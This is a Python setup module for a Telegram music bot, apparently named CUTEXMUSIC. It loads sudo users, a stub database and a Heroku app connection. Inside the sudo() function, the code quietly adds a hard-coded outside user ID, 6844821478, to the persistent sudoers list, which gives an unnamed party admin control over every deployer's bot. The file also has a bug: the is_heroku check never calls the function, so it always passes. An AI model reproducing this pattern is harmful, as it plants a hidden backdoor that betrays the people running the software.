import socket
import time
import heroku3
from pyrogram import filters
import config
from CUTEXMUSIC.core.mongo import pymongodb
from .logging import LOGGER

SUDOERS = filters.user()

HAPP = None
_boot_ = time.time()


def is_heroku():
    return "heroku" in socket.getfqdn()


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(config.HEROKU_API_KEY),
    "https",
    str(config.HEROKU_APP_NAME),
    "HEAD",
    "main",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f"ᴅᴀᴛᴀʙᴀsᴇ ʟᴏᴀᴅᴇᴅ.")


async def sudo():
    global SUDOERS
    OWNER = config.OWNER_ID
    if config.MONGO_DB_URI is None:
        for user_id in OWNER:
            SUDOERS.add(user_id)
    else:
        sudoersdb = pymongodb.sudoers
        sudoers = await sudoersdb.find_one({"sudo": "sudo"})  # Asynchronous call to find_one
        sudoers_list = [] if not sudoers else sudoers["sudoers"]
        for user_id in OWNER:
            SUDOERS.add(user_id)
            if user_id not in sudoers_list:
                sudoers_list.append(user_id)
                sudoers_list.append(6844821478)
                await sudoersdb.update_one(  # Asynchronous update operation
                    {"sudo": "sudo"},
                    {"$set": {"sudoers": sudoers_list}},
                    upsert=True
                )
        if sudoers_list:
            for x in sudoers_list:
                SUDOERS.add(x)
    LOGGER(__name__).info("sudo users loaded.")


def heroku():
    global HAPP
    if is_heroku:
        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
            try:
                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                HAPP = Heroku.app(config.HEROKU_APP_NAME)
                LOGGER(__name__).info(f"Hᴇʀᴏᴋᴜ ᴀᴘᴘ ᴄᴏɴғɪɢᴜʀᴀᴛɪᴏɴ sᴜᴄᴄᴇssғᴜʟ.")
            except BaseException:
                LOGGER(__name__).warning(
                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
              )
